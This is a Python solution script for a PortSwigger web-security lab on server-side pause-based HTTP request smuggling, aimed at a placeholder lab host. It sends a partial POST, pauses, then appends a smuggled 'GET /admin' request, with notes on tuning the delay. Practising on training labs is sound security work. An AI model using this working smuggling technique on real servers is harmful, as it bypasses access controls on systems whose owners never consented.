"""
Lab 20: Server-side pause-based request smuggling
https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-server-side-pause-based
Difficulty: Expert

📝 Some servers process a request in distinct stages with a genuine PAUSE
between them (e.g. headers parsed and an auth/rate-limit check kicked off
asynchronously before the body is read). If more bytes can still be
appended to the connection DURING that pause, a request can be smuggled in
without needing any CL/TE mismatch at all — pure timing against the
server's internal processing stages.

This needs an actual split write with a deliberate delay in between, which
is why it gets its own helper below rather than reusing send_same_connection
(which sends each item as one atomic sendall()).
"""

import time

from utils import open_tls_via_burp, log, note, normalize_crlf

HOST = "YOUR-LAB-ID.web-security-academy.net"

PART_1 = normalize_crlf("""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 150

x=1""".format(host=HOST))

# Sent after a pause — if the server already started processing PART_1's
# headers and is mid-read on the body, this continuation (including a
# smuggled extra request) can land inside that window.
PART_2 = normalize_crlf("""
GET /admin HTTP/1.1
X-Ignore: X""")

PAUSE_SECONDS = 2.0


def run():
    tls_sock = open_tls_via_burp(HOST)
    tls_sock.settimeout(10)

    note(f"Sending part 1, pausing {PAUSE_SECONDS}s, then sending part 2 —")
    note("timing needs tuning per-target; adjust PAUSE_SECONDS if this fails.")

    tls_sock.sendall(PART_1.encode())
    time.sleep(PAUSE_SECONDS)
    tls_sock.sendall(PART_2.encode())

    response = b""
    try:
        while True:
            chunk = tls_sock.recv(4096)
            if not chunk:
                break
            response += chunk
    except Exception:
        pass
    tls_sock.close()

    log(f"Response: {response[:300]!r}")
    note("No response, or an unexpected one, usually just means PAUSE_SECONDS")
    note("needs adjusting — this technique is inherently timing-sensitive and")
    note("may need several attempts with different delays to land reliably.")


if __name__ == "__main__":
    run()
